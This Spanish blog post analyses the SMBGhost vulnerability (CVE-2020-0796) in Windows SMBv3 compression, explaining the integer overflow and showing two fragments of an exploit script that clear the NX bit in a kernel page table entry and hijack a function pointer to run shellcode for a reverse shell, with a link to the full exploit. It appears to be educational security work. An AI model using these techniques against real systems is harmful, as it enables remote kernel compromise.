---
layout: post
title: "eMarisma - Análisis de Riesgos"
date: 2026-2-4
---

## 1. Introducción

Este análisis detalla la vulnerabilidad CVE-2020-0796, conocida como SMBGhost, que afecta al protocolo SMBv3.1.1 en sistemas Windows 10 y Server 2019. El fallo permite la ejecución remota de código (RCE) y la escalada de privilegios local (LPE) debido a un error en el manejo de la compresión de paquetes.

El protocolo **Server Message Block (SMB)** opera en la capa de aplicación (puerto 445) para compartir archivos e impresoras. La vulnerabilidad reside específicamente en la extensión de compresión introducida en la versión 3.1

## 2. La vulnerabilidad (*Integer Overflow*)
El error ocurre en la función Srv2DecompressData del driver srv2.sys. El sistema no valida correctamente el tamaño de los datos descomprimidos.
- Un atacante envía un paquete malicioso con un valor OriginalCompressedSegmentSize manipulado.
- Esto provoca un desbordamiento de entero (Integer Overflow) al asignar memoria.

El resultado es un desbordamiento de búfer (Buffer Overflow) que permite sobrescribir memoria adyacente en el kernel.

![SMBGhost](/img/SMBGhost_1.png)

## 3. Análisis del Exploit

El script desarrollado demuestra cómo explotar este fallo para lograr ejecución de código. El proceso se divide en lectura/escritura arbitraria y elusión de mitigaciones.

**[Pulsa aquí para descargar el código del exploit (Python)](</archivos_posts/Exploit_SMBGhost>)**

En la siguiente figura podemos ver la configuración del entorno de prueba:re

![SMBGhost](/img/SMBGhost_2.png)

### Fase 1: Manipulación de PTE (Page Table Entries)

Para ejecutar código en sistemas modernos, debemos evadir la protección DEP/NX (No-Execute). El exploit localiza la entrada de la tabla de páginas (PTE) correspondiente a la memoria donde reside nuestro shellcode y modifica los bits de permisos.

**Fragmento de código clave (Limpieza del bit NX):**
En el script SMBleedingGhost.py, se calcula la dirección de la PTE y se modifica el byte que controla el bit de ejecución:

```
shellcode_pte = get_pt_from_va(shellcode_address, pte_base)
modify_address = shellcode_pte + 7

# Lectura de los bits actuales
pte_bits = leer(ip_victima, dir_srvnet, dir_pool_memoria, 1, modify_address)

# Modificación: Se aplica una máscara AND con 0x7F para limpiar el bit NX (Bit 63)
# Esto marca la página de memoria como "Ejecutable"
pte_bits = bytes([pte_bits[0] & 0x7F])  # clear NX bit

# Escritura de los bits modificados en memoria del kernel
escribir(ip_victima, pte_bits, modify_address)
print('¡Bit NX limpiado!')
```

### Fase 2: Ejecución del Shellcode

Una vez que la memoria es ejecutable, el exploit sobrescribe un puntero de función del sistema para redirigir el flujo de ejecución hacia el shellcode.

```
# Se prepara el puntero al shellcode
callback_ptr = struct.pack('<Q', shellcode_address)
# Dirección objetivo para sobrescribir (Function Pointer Hijacking)
callback_ptr_address = dir_pool_memoria + 0x50 + 0x1600

# Se escribe el puntero y se detona la ejecución
escribir(ip_victima, callback_ptr, callback_ptr_address)
llamar_funcion(ip_victima, callback_ptr_address, nt_base_ptr)
```

En la siguiente Figura podemos ver el *shell reverse* que se abre en la terminal y un mensaje que notifica que el proceso ha finalizado correctamente.

![SMBGhost](/img/SMBGhost_3.png)

## 4. Conclusión
SMBGhost demuestra cómo un fallo aritmético simple en una nueva funcionalidad (compresión) puede comprometer totalmente la seguridad del kernel. La mitigación principal consiste en desactivar la compresión SMBv3 o aplicar los parches de seguridad de Microsoft de marzo de 2020.

**[Para ver el informe técnico completo, puedes descargarlo pinchando aquí (PDF)](</archivos_posts/Informe_SMBGhost>)**

---
**Escrito por Daniel Barbeyto Torres, Manuel Noya Vázquez y Iker Jesus Pérez García**, *apoyado de herramientas de modelos de lenguaje para la redacción.*